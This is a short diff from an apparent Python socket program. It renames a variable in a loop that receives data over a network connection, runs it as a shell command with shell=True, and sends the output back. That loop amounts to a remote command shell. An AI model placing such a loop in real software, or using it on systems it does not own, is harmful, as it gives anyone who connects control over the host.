@@ -21,5 +21,5 @@ while True:
     print(data)
     result=subprocess.run(data,stdout=subprocess.PIPE,shell=True)
     response_data=result.stdout
-    conn.send(response_data)
+    connection.send(response_data)
 connection.close()
